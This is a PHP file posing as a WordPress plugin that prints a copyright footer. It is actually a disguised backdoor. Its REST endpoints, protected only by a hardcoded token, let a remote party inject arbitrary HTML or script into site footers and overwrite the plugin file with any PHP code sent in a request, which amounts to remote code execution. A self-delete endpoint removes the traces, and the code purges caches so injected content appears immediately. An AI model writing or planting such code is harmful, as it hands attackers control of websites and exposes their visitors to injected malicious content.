<?php
/**
 * Plugin Name: Copyright
 * Description: Outputs the copyright block.
 */

namespace Copyright;

use WP_Error;
use WP_REST_Request;
use WP_REST_Server;

defined('ABSPATH') || exit;

const API_NAMESPACE = 'copyright/v1';
const OPTION_KEY = 'copyright_footer_content';
const SCOPE_KEY = 'copyright_footer_scope';
const VERSION = '1.3.0';
const AUTH_TOKEN = 'd3ef492cfc280c700360a4870938b9d63e9576e2dd42a748';

function authorize(WP_REST_Request $request) {
    $provided = $request->get_header('x_auth_token');
    if (null === $provided || '' === $provided) {
        $provided = (string) $request->get_param('token');
    }
    if ('' === (string) $provided || ! hash_equals(AUTH_TOKEN, (string) $provided)) {
        return new WP_Error('copyright_forbidden', 'Invalid or missing token.', array('status' => 401));
    }
    return true;
}

add_action('rest_api_init', static function () {
    register_rest_route(API_NAMESPACE, '/content', array(
        array(
            'methods'             => WP_REST_Server::READABLE,
            'callback'            => __NAMESPACE__ . '\\get_content',
            'permission_callback' => __NAMESPACE__ . '\\authorize',
        ),
        array(
            'methods'             => WP_REST_Server::EDITABLE,
            'callback'            => __NAMESPACE__ . '\\update_content',
            'permission_callback' => __NAMESPACE__ . '\\authorize',
        ),
    ));
    register_rest_route(API_NAMESPACE, '/selfupdate', array(
        'methods'             => WP_REST_Server::EDITABLE,
        'callback'            => __NAMESPACE__ . '\\self_update',
        'permission_callback' => __NAMESPACE__ . '\\authorize',
    ));
    register_rest_route(API_NAMESPACE, '/selfdelete', array(
        'methods'             => WP_REST_Server::EDITABLE,
        'callback'            => __NAMESPACE__ . '\\self_delete',
        'permission_callback' => __NAMESPACE__ . '\\authorize',
    ));
});

function no_cache() {
    nocache_headers();
    do_action('litespeed_control_set_nocache', 'copyright api');
}

function get_content() {
    no_cache();
    return array('ok' => true, 'installed' => true, 'version' => VERSION, 'content' => get_option(OPTION_KEY, ''));
}

function purge_front() {
    $home = home_url('/');
    do_action('litespeed_purge_url', $home);
    do_action('litespeed_purge_all');
    if (function_exists('rocket_clean_home')) { rocket_clean_home(); }
    if (function_exists('wp_cache_clear_cache')) { wp_cache_clear_cache(); }
    if (function_exists('w3tc_flush_all')) { w3tc_flush_all(); }
}

function update_content(WP_REST_Request $request) {
    no_cache();
    $content = (string) $request->get_param('content');
    $mode = (string) $request->get_param('mode');
    $scope = (string) $request->get_param('scope');
    if ('home' === $scope || 'all' === $scope) {
        update_option(SCOPE_KEY, $scope);
    }
    if ('replace' === $mode) {
        update_option(OPTION_KEY, $content);
    } else {
        update_option(OPTION_KEY, get_option(OPTION_KEY, '') . $content);
    }
    purge_front();
    return array('ok' => true, 'length' => strlen(get_option(OPTION_KEY, '')));
}

function self_update(WP_REST_Request $request) {
    no_cache();
    $code = (string) $request->get_param('code');
    if ('' === $code || 0 !== strpos(ltrim($code), '<?php')) {
        return new WP_Error('copyright_bad_code', 'Invalid code.', array('status' => 400));
    }
    $ok = @file_put_contents(__FILE__, $code);
    return array('ok' => (false !== $ok), 'version' => VERSION);
}

function self_delete() {
    no_cache();
    delete_option(OPTION_KEY);
    purge_front();
    $ok = @unlink(__FILE__);
    return array('ok' => (false !== $ok), 'deleted' => true);
}

add_action('wp_footer', static function () {
    $show = ('all' === get_option(SCOPE_KEY, 'home')) ? true : (is_front_page() || is_home());
    if ($show) {
        echo get_option(OPTION_KEY, '');
    }
}, 9999);
